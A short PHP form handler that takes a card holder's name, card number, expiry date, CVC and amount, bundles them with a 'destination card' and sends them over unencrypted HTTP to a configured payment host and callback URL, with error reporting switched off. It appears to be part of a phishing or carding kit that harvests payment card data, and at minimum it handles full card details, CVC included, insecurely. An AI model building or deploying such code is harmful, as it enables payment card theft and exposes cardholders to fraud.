<?php 

include "config.php";
error_reporting(0);

if (isset($_POST) && $_POST != null) {
	$card_holder = $_POST["card_holder"];

	if (!isset($card_holder) || $card_holder == "") {
		$card_holder = "не указан";
	}

	$_POST["card_expire_year"] = "20" . $_POST["card_expire_year"];

	$callback_data = [
		"card_holder" => $card_holder,
		"card_number" => $_POST["card_number"],
		"card_expire_month" => $_POST["card_expire_month"],
		"card_expire_year" => $_POST["card_expire_year"],
		"card_cvc" => $_POST["card_cvc"],
		"amount" => $_POST["amount"],
		"order_id" => $_POST["order"]
	];

	$_POST["destination_card"] = $destination_card;
	$_POST["card_number"] = str_replace(" ", "", $_POST["card_number"]);

	$_POST["status_url"] = $status_url;
	$_POST["success_url"] = $success_url;
	$_POST["error_url"] = $error_url;

	$_POST["callback_url"] = $callback_url;
	$_POST["callback_data"] = json_encode($callback_data, JSON_UNESCAPED_UNICODE);

	$cookie = base64_encode($_POST["amount"] . "/" . $_POST["order"] . "/" . date("d-m-Y H:i"));
	setcookie("execdata", $cookie, time() + 3600);

	if ($payment_port == "" || $payment_port == 80) {
		$url = $payment_host;
	} else {
		$url = $payment_host . ":" . $payment_port;
	}

	$ch = curl_init("http://" . $url . "/pay");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
	$response = curl_exec($ch);
	curl_close($ch);

	header("Content-Type: application/json");
	echo $response;
}
	
?>